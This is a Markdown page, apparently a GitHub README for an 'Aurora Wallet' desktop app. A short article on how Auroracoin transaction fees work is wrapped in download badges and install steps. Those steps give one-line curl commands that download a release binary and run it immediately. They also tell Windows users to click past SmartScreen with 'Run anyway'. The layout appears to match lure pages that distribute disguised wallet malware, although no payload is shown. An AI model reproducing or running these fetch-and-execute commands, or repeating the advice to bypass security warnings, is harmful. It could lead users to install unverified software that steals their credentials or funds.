![Aurora Wallet transaction fees guide](assets/aurora-wallet-guide-article-banner.png)

# Auroracoin transaction fees: what you pay and why

The small amount attached to every send goes to the miners, and the wallet chooses it for you.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Every Auroracoin transaction carries a fee, paid to the miner that includes it in a block rather than to the Foundation.

The fee is the price of space in a block. Miners prefer transactions that pay more per unit of space, so a fee that matches the network's current expectation confirms quickly while a fee far below it can wait. The wallet sets a sensible amount from the size of the transaction it builds.

<!-- ARTICLE-BODY-BEGIN -->

## How the wallet picks the fee

The size of a transaction depends on how many unspent outputs it spends, not on the amount being sent. A payment funded by one large output is smaller than the same payment funded by fifteen small ones, and the fee follows the size.

The wallet estimates the fee when you press send and shows it before you confirm. Nothing is charged if you cancel at that point.

## Keep fees predictable

1. Consolidate small outputs when the network is quiet, so later payments spend fewer inputs.
2. Send a single larger payment instead of many tiny ones when you control both sides.
3. Check the fee line before confirming; it is the amount the transaction actually pays.
4. Leave the default in place unless you have a specific reason to change it.
5. Watch the confirmation count rather than resending when a transaction waits.

Consolidation is the habit that pays off: a wallet holding many small outputs from mining payouts or repeated receives builds larger transactions for the same value. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/32-mining-payouts.md">Handling mining payouts</a> covers the pattern for regular incoming payments.

## When a fee looks high

A high fee on a small payment almost always means many inputs rather than an expensive network. The work of verifying the transaction scales with its size, so a payment of a few AUR funded by twenty outputs can cost more than a large payment funded by one.

The fee never goes to the wallet developers, and there is no subscription behind the application. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md">Self-custody basics</a> explains why the software you run locally has no account attached to it.

Sending from the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> keeps the fee estimate aligned with the current network.

## FAQ

### Does the Foundation take a share of the fee?

No. The fee goes to the miner that confirms the block.

### Can I send with no fee at all?

A transaction without a fee is usually ignored by miners. It may sit unconfirmed indefinitely.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Pending transaction](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/16-pending-transaction.md)
- [Mining payouts](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/32-mining-payouts.md)
- [On-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md)
- [What is Auroracoin](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/37-what-is-auroracoin-aur.md)
